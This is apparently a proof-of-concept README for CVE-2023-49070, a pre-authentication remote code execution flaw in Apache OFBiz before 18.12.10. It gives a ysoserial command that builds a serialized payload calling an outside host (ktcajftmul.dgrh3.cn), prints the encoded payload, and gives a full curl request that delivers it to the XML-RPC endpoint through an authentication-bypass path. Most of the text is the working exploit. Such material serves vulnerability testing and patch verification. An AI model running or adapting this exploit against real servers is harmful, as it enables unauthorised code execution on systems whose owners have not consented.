# Apache Ofbiz Pre-auth RCE (CVE-2023-49070)

## Affected versions

- Apache OFBiz before 18.12.10

Description:

Pre-auth RCE in Apache Ofbiz 18.12.09.

It's due to XML-RPC no longer maintained still present.
This issue affects Apache OFBiz: before 18.12.10. 
Users are recommended to upgrade to version 18.12.10

This issue is being tracked as OFBIZ-12812 

## Usage

Start the ofbiz with

```bash
docker-compose up
```

craft a poc with ysoserial

```bash
java -jar ysoserial.jar URLDNS "http://ktcajftmul.dgrh3.cn" | base64 | tr -d "\n"
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAE2t0Y2FqZnRtdWwuZGdyaDMuY250AABxAH4ABXQABGh0dHBweHQAGmh0dHA6Ly9rdGNhamZ0bXVsLmRncmgzLmNueA==
```

send it to `https://localhost:8443/webtools/control/xmlrpc`

```
$ curl https://localhost:8443/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAE2t0Y2FqZnRtdWwuZGdyaDMuY250AABxAH4ABXQABGh0dHBweHQAGmh0dHA6Ly9rdGNhamZ0bXVsLmRncmgzLmNueA==</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```

## Reference

1. https://seclists.org/oss-sec/2023/q4/257
2. https://x.com/Siebene7/status/1731870759130427726?s=20